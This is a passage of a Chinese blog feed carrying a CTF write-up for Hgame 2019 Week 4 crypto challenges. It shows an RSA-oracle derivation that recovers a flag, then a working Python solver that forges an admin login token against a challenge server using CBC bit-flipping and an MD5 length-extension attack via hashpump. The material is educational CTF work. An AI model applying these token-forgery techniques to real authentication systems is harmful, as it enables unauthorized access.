stretchy="false">)</mo><mo>=</mo><mi>R</mi><mi>S</mi><msup><mi>A</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo stretchy="false">(</mo><mi>c</mi><mi>i</mi><mi>p</mi><mi>h</mi><mi>e</mi><mi>r</mi><mo stretchy="false">)</mo><mo>⊕</mo><mi>R</mi><mi>S</mi><mi>A</mi><mo stretchy="false">(</mo><mi>i</mi><mi>v</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">decryptZero(cipher)=RSA^{-1}(cipher) \oplus RSA(iv)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">e</span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault">p</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">o</span><span class="mopen">(</span><span class="mord mathdefault">c</span><span class="mord mathdefault">i</span><span class="mord mathdefault">p</span><span class="mord mathdefault">h</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">c</span><span class="mord mathdefault">i</span><span class="mord mathdefault">p</span><span class="mord mathdefault">h</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">A</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mclose">)</span></span></span></span></span></p><p>所以</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi><mi>e</mi><mi>c</mi><mi>r</mi><mi>y</mi><mi>p</mi><mi>t</mi><mo stretchy="false">(</mo><mi>d</mi><mi>e</mi><mi>c</mi><mi>r</mi><mi>y</mi><mi>p</mi><mi>t</mi><mi>Z</mi><mi>e</mi><mi>r</mi><mi>o</mi><mo stretchy="false">(</mo><mi>Z</mi><mi>E</mi><mi>R</mi><mi>O</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>=</mo><mi>R</mi><mi>S</mi><msup><mi>A</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo stretchy="false">(</mo><mi>R</mi><mi>S</mi><msup><mi>A</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo stretchy="false">(</mo><mi>Z</mi><mi>E</mi><mi>R</mi><mi>O</mi><mo stretchy="false">)</mo><mo>⊕</mo><mi>R</mi><mi>S</mi><mi>A</mi><mo stretchy="false">(</mo><mi>i</mi><mi>v</mi><mo stretchy="false">)</mo><mo>⊕</mo><mi>R</mi><mi>S</mi><mi>A</mi><mo stretchy="false">(</mo><mi>i</mi><mi>v</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>⊕</mo><mi>i</mi><mi>v</mi><mspace linebreak="newline"></mspace><mo>=</mo><mi>R</mi><mi>S</mi><msup><mi>A</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo stretchy="false">(</mo><mi>R</mi><mi>S</mi><msup><mi>A</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo stretchy="false">(</mo><mi>Z</mi><mi>E</mi><mi>R</mi><mi>O</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>⊕</mo><mi>i</mi><mi>v</mi><mspace linebreak="newline"></mspace><mo>=</mo><mi>Z</mi><mi>E</mi><mi>R</mi><mi>O</mi><mo>⊕</mo><mi>i</mi><mi>v</mi><mspace linebreak="newline"></mspace><mo>=</mo><mi>i</mi><mi>v</mi></mrow><annotation encoding="application/x-tex">decrypt(decryptZero(ZERO))=RSA^{-1}(RSA^{-1}(ZERO) \oplus RSA(iv)\oplus RSA(iv))\oplus iv\\=RSA^{-1}(RSA^{-1}(ZERO)))\oplus iv\\=ZERO\oplus iv\\=iv</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">e</span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault">p</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord mathdefault">d</span><span class="mord mathdefault">e</span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault">p</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">o</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mclose">)</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">A</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">A</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mclose">)</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mclose">)</span><span class="mclose">)</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span></span></span></span></span></p><p>所以netcat以后，实际操作如下</p><ol><li>选择decrypt，发送1024个0，也就是512B。</li><li>截取接受到后半部分，再次选择decrypt，发送。</li></ol><p><img src="/images/hgame-week4/nc.png" alt="nc" /></p><p>所以截取iv如下:<br /><code>0000000000006867616d657b415f6c6974746c655f686172645f5273343f7d6867616d657b415f6c6974746c655f686172645f5273343f7d6867616d657b415f6c6974746c655f686172645f5273343f7d6867616d657b415f6c6974746c655f686172645f5273343f7d6867616d657b415f6c6974746c655f686172645f5273343f7d6867616d657b415f6c6974746c655f686172645f5273343f7d6867616d657b415f6c6974746c655f686172645f5273343f7d6867616d657b415f6c6974746c655f686172645f5273343f7d6867616d657b415f6c6974746c655f686172645f5273343f7d6867616d657b415f6c6974746c655f686172645f5273343f7d</code></p><p>正如前面说过的这里的循环体(<code>6867616d657b415f6c6974746c655f686172645f5273343f7d</code>)就是flag的ASCII的十六进制</p><p>解码得到<code>hgame{A_little_hard_Rs4?}</code></p><h3 id="3-sign_in_semihard"><a class="markdownIt-Anchor" href="#3-sign_in_semihard"></a> 3. Sign_in_SemiHard</h3><h4 id="question-5"><a class="markdownIt-Anchor" href="#question-5"></a> Question</h4><p>Description</p><p>47.95.212.185 38611<br />仍然是由CNSS友情赞助 大量的心！<br />**hint:**不要想着一步到位 一段一段来 或者 碰碰运气(如果你比较欧的话</p><p>URL</p><p><a href="http://plqbnxx54.bkt.clouddn.com/Sign_in_SemiHard.py" target="_blank" rel="noopener">http://plqbnxx54.bkt.clouddn.com/Sign_in_SemiHard.py</a></p><p>Base Score</p><p>500</p><h4 id="answer-5"><a class="markdownIt-Anchor" href="#answer-5"></a> Answer</h4><p>照样看源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> signal <span class="keyword">import</span> alarm</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sign</span>:</span></span><br><span class="line">    block = T = <span class="number">0</span></span><br><span class="line">    key = salt = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, key, salt)</span>:</span></span><br><span class="line">        self.key = key</span><br><span class="line">        self.salt = salt</span><br><span class="line">        self.block = len(key)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(self, username)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">b'admin'</span> <span class="keyword">in</span> username:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        sig = md5(self.salt + username).digest()</span><br><span class="line">        padlen = self.block - len(username) % self.block</span><br><span class="line">        username += bytes([padlen] * padlen)</span><br><span class="line">        iv = urandom(self.block)</span><br><span class="line">        aes = AES.new(self.key, AES.MODE_CBC, iv)</span><br><span class="line">        c = aes.encrypt(username)</span><br><span class="line">        <span class="keyword">return</span> iv + c + sig</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(self, cipher)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> len(cipher) % self.block != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        self.T -= <span class="number">1</span></span><br><span class="line">        iv = cipher[:self.block]</span><br><span class="line">        sig = cipher[-self.block:]</span><br><span class="line">        cipher = cipher[self.block:-self.block]</span><br><span class="line">        aes = AES.new(self.key, AES.MODE_CBC, iv)</span><br><span class="line">        p = aes.decrypt(cipher)</span><br><span class="line">        p = p[:-p[<span class="number">-1</span>]]</span><br><span class="line">        <span class="keyword">return</span> [p, md5(self.salt + p).digest() == sig]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    unprintable = <span class="string">b""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> chr(i) <span class="keyword">not</span> <span class="keyword">in</span> string.printable:</span><br><span class="line">            unprintable += bytes([i])</span><br><span class="line">    alarm(<span class="number">60</span>)</span><br><span class="line">    s = Sign(urandom(<span class="number">16</span>), urandom(<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        print(<span class="string">"Choose:\n[1] Register\n[2] Login"</span>)</span><br><span class="line">        op = input()</span><br><span class="line">        <span class="keyword">if</span> op == <span class="string">'1'</span>:</span><br><span class="line">            user = input(<span class="string">"Input your username(hex): "</span>)</span><br><span class="line">            token = s.register(bytes.fromhex(user))</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">                print(<span class="string">"Sorry, invalid username."</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"Your token is: %s"</span> % token.hex())</span><br><span class="line">        <span class="keyword">elif</span> op == <span class="string">'2'</span>:</span><br><span class="line">            token = input(<span class="string">"Input your token: "</span>)</span><br><span class="line">            res = s.login(bytes.fromhex(token))</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> res:</span><br><span class="line">                print(<span class="string">"Sorry, invalid token."</span>)</span><br><span class="line">            <span class="keyword">elif</span> <span class="keyword">not</span> res[<span class="number">1</span>]:</span><br><span class="line">                user = res[<span class="number">0</span>].hex()</span><br><span class="line">                print(<span class="string">"Sorry, your username(hex) %s is inconsistent with given signature."</span> % user)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                user = res[<span class="number">0</span>].strip(unprintable).decode(<span class="string">"Latin1"</span>)</span><br><span class="line">                print(<span class="string">"Login success. Welcome, %s!"</span> % user)</span><br><span class="line">                <span class="keyword">if</span> user == <span class="string">"admin"</span>:</span><br><span class="line">                    print(<span class="string">"I have a gift for you: %s"</span> % FLAG)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"See you"</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>这个看下来就是名副其实的<a href="https://ctf-wiki.github.io/ctf-wiki/crypto/blockcipher/mode/cbc/" target="_blank" rel="noopener">CBC</a>了，而且还是带盐的md5验证。</p><p><code>register</code>的时候不许用<code>admin</code>，甚至不能包含<code>admin</code>。</p><p>然后又要<code>login</code>的时候，名字去掉头尾的unprintable字符刚刚好是<code>&quot;admin&quot;</code>。</p><p>那么就要用到CBC的<code>字节反转攻击</code>来让最后的名字是admin，</p><p>以及对带盐的MD5的进行<code>哈希长度扩展攻击</code>。</p><p>代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">pad = <span class="string">b'e4b8ad'</span></span><br><span class="line">PAD = <span class="string">b'e4b8ad80000000000000000000000000000000000000000000000000000000000000000000000000980000000000000060646d696e'</span></span><br><span class="line"></span><br><span class="line">START = <span class="string">b'\xe4\xb8\xad\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'</span></span><br><span class="line">ZERO = <span class="string">b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'</span></span><br><span class="line">END = <span class="string">b'\x00\x00\x00\x00\x00\x00\x00\x00\x98\x00\x00\x00\x00\x00\x00\x00'</span></span><br><span class="line">ADMIN = <span class="string">b'\x61\x64\x6d\x69\x6e\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b'</span></span><br><span class="line"></span><br><span class="line">targets = [START, ZERO, END, ADMIN]</span><br><span class="line"></span><br><span class="line">admin = <span class="string">b'\x60\x64\x6d\x69\x6e\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b'</span>.hex()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span> <span class="keyword">return</span> bytes(x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(a, b))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_attack</span><span class="params">(key, origin, target)</span>:</span> <span class="keyword">return</span> xor(target, xor(bytes.fromhex(origin), bytes.fromhex(key)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">block = <span class="number">32</span></span><br><span class="line"></span><br><span class="line">hostname = <span class="string">'47.95.212.185'</span></span><br><span class="line">port = <span class="number">38611</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((hostname, port))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拿到PAD的token</span></span><br><span class="line">repr(s.recv(<span class="number">1024</span>))</span><br><span class="line">s.sendall(<span class="string">b'1\n'</span>)</span><br><span class="line">repr(s.recv(<span class="number">1024</span>))</span><br><span class="line">s.sendall(PAD + <span class="string">b'\n'</span>)</span><br><span class="line">token = repr(s.recv(<span class="number">1024</span>)).split(<span class="string">' '</span>)[<span class="number">3</span>].split(<span class="string">'\\'</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 字节反转攻击</span></span><br><span class="line">token = token[:block * <span class="number">3</span>] + xor_attack(token[block * <span class="number">3</span>:block * <span class="number">4</span>], admin, ADMIN).hex() + token[block * <span class="number">4</span>:block * <span class="number">6</span>]</span><br><span class="line">s.sendall(<span class="string">b'2\n'</span>)</span><br><span class="line">repr(s.recv(<span class="number">1024</span>))</span><br><span class="line">s.sendall(token.encode(<span class="string">'utf-8'</span>) + <span class="string">b'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    result = repr(s.recv(<span class="number">1024</span>)).split(<span class="string">' '</span>)[<span class="number">3</span>]</span><br><span class="line">    start = block * (<span class="number">2</span> - i)</span><br><span class="line">    token = token[:start] \</span><br><span class="line">            + xor_attack(token[start:start + block], result[start:start + block], targets[<span class="number">2</span> - i]).hex() \</span><br><span class="line">            + token[start + block:block * <span class="number">6</span>]</span><br><span class="line">    s.sendall(<span class="string">b'2\n'</span>)</span><br><span class="line">    repr(s.recv(<span class="number">1024</span>))</span><br><span class="line">    s.sendall(token.encode(<span class="string">'utf-8'</span>) + <span class="string">b'\n'</span>)</span><br><span class="line"></span><br><span class="line">repr(s.recv(<span class="number">1024</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># get md5 of start</span></span><br><span class="line">s.sendall(<span class="string">b'1\n'</span>)</span><br><span class="line">repr(s.recv(<span class="number">1024</span>))</span><br><span class="line">s.sendall(pad + <span class="string">b'\n'</span>)</span><br><span class="line"><span class="comment"># 这里输出的md5 应该放到hashpump中生成对应的md5</span></span><br><span class="line">print(repr(s.recv(<span class="number">1024</span>)).split(<span class="string">' '</span>)[<span class="number">3</span>].split(<span class="string">'\\'</span>)[<span class="number">0</span>][-block:])</span><br><span class="line"></span><br><span class="line"><span class="comment"># input md5 from hashpump</span></span><br><span class="line">s.sendall(<span class="string">b'2\n'</span>)</span><br><span class="line">repr(s.recv(<span class="number">1024</span>))</span><br><span class="line">s.sendall(token[:block * <span class="number">5</span>].encode(<span class="string">'utf-8'</span>) + input().encode(<span class="string">'utf-8'</span>) + <span class="string">b'\n'</span>)</span><br><span class="line">print(<span class="string">"Received:"</span>, repr(s.recv(<span class="number">1024</span>)))</span><br></pre></td></tr></table></figure><p>由于我没有直接在python用hashpump（安不起来。。。），所以我在倒数第二部输出了md5</p><p>然后 在linux里执行</p><p><code>hashpump -d 中 -k 16 -a admin -s f5e0ad400b2a12944729d217df0860a2</code></p><blockquote><p>PS：这里的<code>-d 中</code>是因为hashpump非要我输入一个data，但是按照代码又不能是<code>string.printable</code>，所以就弄了个中文，也就是前面那个奇怪的<code>\xe4\xb8\xad</code></p></blockquote><p>假设<code>f5e0ad400b2a12944729d217df0860a2</code>就是刚输出的md5</p><p>那么会得到</p><blockquote><p>d5c7a0383be95b611053e20298ba3f10<br />\xe4\xb8\xad\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x98\x00\x00\x00\x00\x00\x00\x00admin</p></blockquote><p>只要把<code>d5c7a0383be95b611053e20298ba3f10</code>输回到input里即可</p><p>返回得到</p><blockquote><p>Login success. Welcome, admin!\nI have a gift for you: hgame{hard_cryptooooo!}\nChoose:\n[1] Register\n[2] Login\n</p></blockquote><p>所以flag就是<code>hgame{hard_cryptooooo!}</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;iv-misc&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#iv-misc&quot;&gt;&lt;/a&gt; Ⅳ MISC&lt;/h2&gt;
&lt;h3 id=&quot;1-warmup&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-warmu
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://blog.rainbowyang.moe/categories/CTF/"/>
    
    
      <category term="WriteUp" scheme="https://blog.rainbowyang.moe/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>Writeup of Hgame 2019 Week3</title>
    <link href="https://blog.rainbowyang.moe/post/CTF/Hgame-2019-Writeup-Week3.html"/>
    <id>https://blog.rainbowyang.moe/post/CTF/Hgame-2019-Writeup-Week3.html</id>
    <published>2019-02-16T06:30:00.000Z</published>
    <updated>2020-07-14T08:14:07.331Z</updated>
    
